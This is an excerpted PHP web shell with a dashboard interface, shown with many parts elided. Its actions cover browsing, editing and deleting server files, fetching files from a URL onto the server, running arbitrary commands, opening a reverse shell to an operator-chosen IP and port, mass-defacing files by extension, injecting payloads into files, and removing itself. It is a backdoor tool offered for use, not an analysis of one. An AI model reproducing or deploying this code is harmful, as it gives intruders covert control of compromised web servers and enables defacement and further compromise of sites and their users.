    ...
    switch ($action) {
        ...
        case 'zip':
            ...
            if (!empty($files) && class_exists('ZipArchive')) {
                ...
                $response['message'] = 'ZipArchive not available or no files selected';
            }
            break;
        ...
        case 'download_url':
            ...
            if ($url) {
                ...
                if ($content !== false && @file_put_contents($filename, $content) !== false) {
                    $response['success'] = true;
        ...
        case 'back_connect':
            ...
            if ($ip && $port) {
                ...
                if ($sock) {
                    ...
                    $response['message'] = "Failed to connect: $errstr";
                }
            }
            break;
...
// Handle directory change via POST (non-ajax)
if (isset($_POST['dir']) && is_dir($_POST['dir']) && !isset($_POST['ajax'])) {
    chdir($_POST['dir']);
}
...
// Handle direct file edit
if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    if (isset($_POST['save'])) {
        file_put_contents($edit_file, $_POST['data'] ?? '');
    }
}
?>
<!DOCTYPE html>
...
<body>
    ...
    <div class="taskbar" id="taskbar">
        <button class="taskbar-item active" onclick="openSection('files')">
    ...
    <div class="main-container">
        ...
        <div class="header">
            ...
            <div class="server-info">
                <div style="display:flex;align-items:center;gap:8px;color:#94a3b8">
                    ...
                    <span><?= htmlspecialchars($_SERVER['HTTP_HOST'] ?? 'Unknown') ?></span>
                </div>
                <div style="display:flex;align-items:center;gap:8px;color:#94a3b8">
                ...
                <div style="display:flex;align-items:center;gap:8px;color:#94a3b8">
                    ...
                    <span><?= sz(@disk_free_space(".") ?: 0) ?> free</span>
                </div>
            </div>
        ...
        <!-- Alert Container -->
        <div id="alert-container" style="position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:1002;width:90%;max-width:500px"></div>
        ...
        <div class="content-area">
            ...
            <div id="files-section" class="content-section active">
                ...
                <div id="action-buttons" style="margin-top:20px;display:flex;flex-wrap:wrap;gap:10px">
            ...
            <div id="backconnect-section" class="content-section">
                ...
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px">
                    ...
                    <div class="form-group">
                        <label>Port</label>
                        <input type="number" id="connect-port" class="form-control" placeholder="4444" min="1" max="65535">
                    </div>
                </div>
            ...
            <div id="remove-section" class="content-section">
                ...
                <div style="background:rgba(239,68,68,0.1);padding:30px;border-radius:8px;text-align:center">
                    ...
                    <form method="post" style="display:inline">
                        <button type="submit" name="self_remove" value="1" class="btn btn-danger" style="padding:15px 40px" onclick="return confirm('Are you sure? This cannot be undone!')">
    ...
    document.addEventListener('DOMContentLoaded', function() {
        ...
        document.querySelector('.taskbar-item.active').click();
    });
    ...
    async function ajaxRequest(action, data = {}) {
        ...
        try {
            showAlert('info', 'Processing...', 3000);
            ...
            if (result.success) {
                showAlert('success', result.message, 5000);
            } else {
                showAlert('error', result.message || 'Action failed', 5000);
            }
            
            return result;
        } catch (error) {
            showAlert('error', 'Request failed: ' + error.message, 5000);
    ...
    async function loadFiles() {
        ...
        if (result.success) {
            ...
            if (result.data.length === 0) {
                container.innerHTML = '<div style="text-align:center;padding:40px;color:#94a3b8"><i class="fas fa-folder-open" style="font-size:48px;margin-bottom:20px"></i><p>Empty directory</p></div>';
                return;
            }
            ...
            result.data.forEach(file => {
                const safePath = encodeURIComponent(file.path).replace(/'/g, "\\'");
                const safeName = file.name.replace(/</g, "&lt;").replace(/>/g, "&gt;");
                
                html += `
                    <tr>
                        <td><input type="checkbox" value="${safePath}" onchange="updateSelectedFiles()"></td>
                        <td>
                            <i class="fas ${file.is_dir ? 'fa-folder' : 'fa-file'}" style="color:${file.is_dir ? 'var(--success)' : 'var(--primary)'};margin-right:10px"></i>
                            ${file.is_dir ? 
                                `<a href="#" onclick="enterDirectory('${safePath}'); return false;" style="color:white;text-decoration:none">${safeName}</a>` : 
                                safeName
                            }
                        </td>
                        <td>${file.size}</td>
                        ...
                        <td>
                            ${!file.is_dir ? `
                                <button class="btn btn-info" onclick="editFile('${safePath}')" style="padding:5px 10px;font-size:12px;margin-right:5px">
                                    <i class="fas fa-edit"></i>
                                </button>
                                <a href="?download=${safePath}" class="btn btn-success" style="padding:5px 10px;font-size:12px;margin-right:5px;display:inline-block">
                                    <i class="fas fa-download"></i>
                                </a>
                                ${file.ext === 'zip' ? `
                                    <button class="btn btn-warning" onclick="extractFile('${safePath}')" style="padding:5px 10px;font-size:12px">
    ...
    function updateSelectedFiles() {
        selectedFiles = Array.from(document.querySelectorAll('#files-container input[type="checkbox"]:checked'))
            .map(cb => cb.value)
            .filter(v => v);
    }
    ...
    async function enterDirectory(path) {
        const result = await ajaxRequest('change_dir', { dir: decodeURIComponent(path) });
        if (result.success) {
            loadFiles();
        }
    }
    ...
    async function copyFiles() {
        if (selectedFiles.length === 0) {
            showAlert('warning', 'Please select files first', 3000);
            return;
        }
        
        const result = await ajaxRequest('copy', { files: selectedFiles.map(f => decodeURIComponent(f)) });
        if (result.success) {
            updatePasteButton();
        }
    }
    ...
    async function cutFiles() {
        ...
        const result = await ajaxRequest('cut', { files: selectedFiles.map(f => decodeURIComponent(f)) });
        if (result.success) {
            updatePasteButton();
        }
    }
    ...
    async function deleteFiles() {
        ...
        const result = await ajaxRequest('delete', { files: selectedFiles.map(f => decodeURIComponent(f)) });
        if (result.success) {
            loadFiles();
            selectedFiles = [];
        }
    ...
    async function createZip() {
        ...
        const zipname = document.getElementById('zip-name').value || 'archive.zip';
        const result = await ajaxRequest('zip', { 
            files: selectedFiles.map(f => decodeURIComponent(f)), 
            zipname: zipname 
        });
    ...
    async function extractFile(path) {
        ...
        const result = await ajaxRequest('unzip', { 
    ...
    async function editFile(path) {
        const result = await ajaxRequest('edit_file', { file: decodeURIComponent(path) });
        ...
        if (result.success) {
            ...
            container.innerHTML = `
                <div style="margin-bottom:20px">
                    <button class="btn btn-primary" onclick="loadFiles()" style="margin-bottom:15px">
                        <i class="fas fa-arrow-left"></i> Back to Files
                    </button>
                    <h3>Editing: ${fileName}</h3>
                </div>
                <textarea id="editor-content" style="width:100%;height:400px;font-family:monospace;background:#0f172a;color:white;padding:15px;border-radius:8px;border:1px solid rgba(255,255,255,0.2);margin-bottom:15px">${result.data}</textarea>
                <div>
    ...
    async function downloadFromUrl() {
        ...
        const filename = document.getElementById('custom-name').value || '';
        
        if (!url) {
            showAlert('warning', 'Please enter URL', 3000);
            return;
        }
    ...
    async function massDeface() {
        ...
        if (!extensions || !message) {
            showAlert('warning', 'Please enter extensions and message', 3000);
            return;
        }
    ...
    async function executeCommand() {
        ...
        if (!cmd) {
            showAlert('warning', 'Please enter command', 3000);
            return;
        }
        ...
        if (result.success) {
            document.getElementById('console-output').textContent = result.data || '(No output)';
        }
    }
    ...
    async function backConnect() {
        ...
        if (!ip || !port) {
            showAlert('warning', 'Please enter IP and port', 3000);
            return;
        }
        ...
        if (result.success && result.data) {
            showAlert('info', 'Connection output: ' + result.data, 10000);
        }
    }
    ...
    async function injectWaf() {
        ...
        if (!file || !payload) {
            showAlert('warning', 'Please enter file and payload', 3000);
            return;
        }
        ...
        if (result.success) {
            document.getElementById('waf-file').value = '';
        }
    }
    
    // Load zip files for zip tools
    async function loadZipFiles() {
        ...
        if (result.success) {
                ...
                if (!file.is_dir) {
                    ...
                    zipFileList += `
                        <div style="display:flex;align-items:center;gap:10px;margin-bottom:5px">
                            <input type="checkbox" id="zipfile_${safePath}" value="${safePath}">
                            <label for="zipfile_${safePath}" style="color:#94a3b8">
            ...
            document.getElementById('zip-file-list').innerHTML = zipFileList || '<p style="color:#94a3b8">No files found</p>';
            
            // Extract ZIP section
            let zipFiles = '';
            const zipItems = result.data.filter(f => f.ext === 'zip');
            
            if (zipItems.length > 0) {
                zipItems.forEach(file => {
                    const safePath = encodeURIComponent(file.path);
                    zipFiles += `
                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;padding:10px;background:rgba(255,255,255,0.05);border-radius:5px">
                ...
                document.getElementById('zip-files-list').innerHTML = zipFiles;
            } else {
                document.getElementById('zip-files-list').innerHTML = '<p style="color:#94a3b8">No ZIP files found</p>';
            }
        }
    }
    
    async function createSelectedZip() {
        const selected = Array.from(document.querySelectorAll('#zip-file-list input[type="checkbox"]:checked'))
        ...
        const zipname = document.getElementById('create-zip-name').value || 'archive.zip';
        const result = await ajaxRequest('zip', { 
            files: selected, 
            zipname: zipname 
        });
    ...
    function updatePasteButton() {
        ...
        // Check if there's something in clipboard via AJAX
        fetch('', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'ajax=1&action=check_clipboard'
        }).then(r => r.json()).then(data => {
            btn.disabled = !data.hasClipboard;
        }).catch(() => {
            btn.disabled = true;
        });
    }
    ...
    // Add AJAX endpoint for clipboard check
    document.addEventListener('DOMContentLoaded', function() {
        // Intercept form submissions for non-AJAX actions
        document.addEventListener('submit', function(e) {
            if (e.target.method === 'post' && !e.target.querySelector('[name="ajax"]')) {
